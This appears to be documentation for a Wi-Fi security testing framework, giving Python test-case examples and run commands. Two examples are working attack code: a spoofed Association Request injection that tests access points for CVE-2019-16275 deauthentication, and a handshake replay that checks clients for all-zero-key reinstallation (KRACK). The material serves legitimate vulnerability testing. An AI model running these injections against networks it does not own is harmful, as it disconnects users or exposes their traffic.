# Examples

Our framework supports a variety of use cases, and here we present some examples together with their usage instructions.

For their implementations, see [the source code of all examples](../test-examples.py).

#### Table of Contents
1. [Demonstration](#demonstration).
2. [Wi-Fi PMF Deauthentication Vulnerability](#wi-fi-pmf-deauthentication-vulnerability).
3. [All-Zero Key Reinstallation Vulnerability](#all-zero-key-reinstallation-vulnerability).
4. [Customized Control Interface Command](#customized-control-interface-command).

#### Python Virtual Environment

Activate the Python3 virtual environment before every usage:
```
source setup/venv/bin/activate
```

## Demonstration

In the following example, we demonstrate how a test case is written, and highlight basic features.

Specifically, we inject a frame and create a user-defined function to send a ping command over the _hostap_ control interface.

#### Definition
```python
class Demonstration(Test):
	"""Simplified demonstration presenting the basic test case structure."""
	name = "example-demo"
	kind = Test.Supplicant

	def __init__(self):
		"""Initialization of the sequential actions defining the test case."""
		super().__init__([
			# Once authenticated, we will inject a frame.
			Action( trigger=Trigger.AfterAuth, action=Action.Inject ),
			# Once connected, we will call a user-defined function. 
			Action( trigger=Trigger.Connected, action=Action.Function )
		])


	def ping(self, station):
		"""User-defined function, giving us run-time access to the station.""" 
		# For example, we will send a command over the control interface. 
		response = station.wpaspy_command("PING")
		if "PONG" in response:
			log(STATUS,'Received a PONG from the control interface.')


	def generate(self, station):
		"""Generate the test case by configuring the defined actions."""
		
		# Create a Dot11-frame with dummy payload.
		frame = station.get_header() # Returns Dot11()-header.
		frame /= LLC()/SNAP()/Raw(b'A'*32)
		
		# Load the frame into our action, and let us sent it encrypted.
		self.actions[0].set_frame( frame , mon=True , encrypt=True )

		# Load our user-defined function, PING'ing the control interface.
		# (Optional) Automatically terminate the test case after our action.
		self.actions[1].set_function( self.ping )
		self.actions[1].set_terminate( delay=2 )
```

#### Configuration
Load any configuration, for example, ```wpa2-personal```:
```
cd setup; ./load-config.sh wpa2-personal
```

#### Execution
Let us start an access point:
```
./hostap.py wlan0 --ap
```
We can now run our client, which will perform the demonstration:
```
./run.py wlan1 example-demo
```

## Wi-Fi PMF Deauthentication Vulnerability

Test for deauthentication vulnerabilities when Wi-Fi Protected Management Frames (PMF) is enabled.

Specifically, we test if an access point is vulnerable to ```CVE-2019-16275```.

This example tests weaknesses in access points, by acting as a supplicant.

#### Definition
```python
class ExamplePMFDeauthCVE(Test):
	"""Deauthentication vulnerability against an access point (CVE-2019-16275)."""
	name = "example-pmf-deauth"
	kind = Test.Supplicant
	
	def __init__(self):
		super().__init__([
			# Inject an invalid Association Request.
			Action( trigger=Trigger.Connected, action=Action.Inject ),
			# If the station is disconnected, we can terminate the test.
			Action( trigger=Trigger.Disconnected, action=Action.Terminate )
		])


	def generate(self, station):
		
		# Contruct an invalid Association Request using a Broadcast MAC address.
		frame = Dot11()/Dot11AssoReq()
		frame[Dot11].addr1 = station.bss
		frame[Dot11].addr2 = "ff:ff:ff:ff:ff:ff" # Source Address.
		frame[Dot11].addr3 = station.bss
		
		# Transmit plaintext frame, after some delay.
		self.actions[0].set_frame( frame , encrypt=False , mon=True )
		self.actions[0].set_delay( 2 )
```

#### Configuration
Load configuration ```wpa3-personal-pmf```, enforcing usage of Wi-Fi PMF:
```
cd setup; ./load-config.sh wpa3-personal-pmf
```

#### Execution
Let us start an access point which we will test:
```
./hostap.py wlan0 --ap
```
We can now run our client, which will perform the test:
```
./run.py wlan1 example-pmf-deauth
```

## All-Zero Key Reinstallation Vulnerability

Test for key reinstallation vulnerabilities against a client station.

Specifically, we test if the client encrypts frames with an all-zero pairwise key.

This example tests weaknesses in clients, by acting as an access point

#### Definition
```python
class ExampleKrackZerokey(Test):
	"""Test if a client is vulnerable to an all-zero key reinstallation attack."""
	name = "example-krack-zero-key"
	kind = Test.Authenticator
	
	def __init__(self):
		super().__init__([
			# Replay 4-Way Handshake Message 3/4.
			Action( trigger=Trigger.Connected, action=Action.Function ),
			# Receive all frames and search for one encrypted with an all-zero key.
			Action( trigger=Trigger.NoTrigger, action=Action.Receive ),
			# When we receive such a frame, we can terminate the test.
			Action( trigger=Trigger.Received, action=Action.Terminate )
		])


	def resend(self, station):
		# Resend 4-Way Handshake Message 3/4.
		# https://w1.fi/cgit/hostap/plain/tests/cipher-and-key-mgmt-testing.txt
		station.wpaspy_command("RESEND_M3 " + station.clientmac )


	def receive(self, station, frame):
		if frame[Dot11].addr2 != station.clientmac:
			return False
		if not frame.haslayer(Dot11CCMP):
			return False
		# We now received a CCMP-encrypted frame from our client.
		# Let us try to decrypt it with an all-zero key.
		key = b"\x00"*16
		plaintext = decrypt_ccmp(frame.getlayer(Dot11),tk=key)
		if plaintext is None: return False
		# We received a valid plaintext frame!
		log(STATUS, plaintext.summary(), color="orange")
		log(STATUS,'Client encrypted a frame with an all-zero key!', color="green")
		return True


	def generate(self, station):
	
		# Force the client to reinstall the pairwise key.
		self.actions[0].set_function( self.resend )
		self.actions[0].set_delay( 2 )

		# Now let us receive all frames and test for all-zero encryption keys.
		self.actions[1].set_receive( self.receive , mon=True )
```

#### Configuration
Load configuration ```wpa2-personal```:
```
cd setup; ./load-config.sh wpa2-personal
```

#### Execution
We can now run our access point, which will perform the test:
```
./run.py wlan0 example-krack-zero-key
```
And connect with our client which we wish to test:
```
./hostap.py wlan1 --binary ./dependencies/hostap_2_5/wpa_supplicant/wpa_supplicant
```
Note this test case requires a vulnerable ```wpa_supplicant``` (Version 2.5).

#### Miscellaneous 
Force some data traffic from the client:
```
ping -I wlan1 1.1.1.1
```

## Customized Control Interface Command

Test for issuing customized commands on the control interface.

Specifically, we request the supplicant to provide us with the network's BSSID.

For more information, see [our tutorial on extending the control interface](EXTENSIONS.md).

#### Definition
```python
class ExampleGetBSSID(Test):
	"""Example executing customized control interface commands."""
	name = "example-control-iface-extensions"
	kind = Test.Supplicant
	
	def __init__(self):
		super().__init__([
			Action( trigger=Trigger.Connected, action=Action.Function )
		])


	def get_bssid(self, station):
		log(STATUS,'Sending GET_BSSID request to control interface.')
		response = station.wpaspy_command("GET_BSSID")
		log(STATUS,'Received ' + response + '.')


	def generate(self, station):
	
		# Execute a command and terminate. 
		self.actions[0].set_function( self.get_bssid )
		self.actions[0].set_terminate()
```

#### Configuration
Load any configuration, for example, ```wpa2-personal```:
```
cd setup; ./load-config.sh wpa2-personal
```

#### Execution
Let us start an access point:
```
./hostap.py wlan0 --ap
```
We can now run our client, which will issue our custom command:
```
./run.py wlan1 example-control-iface-extensions
```
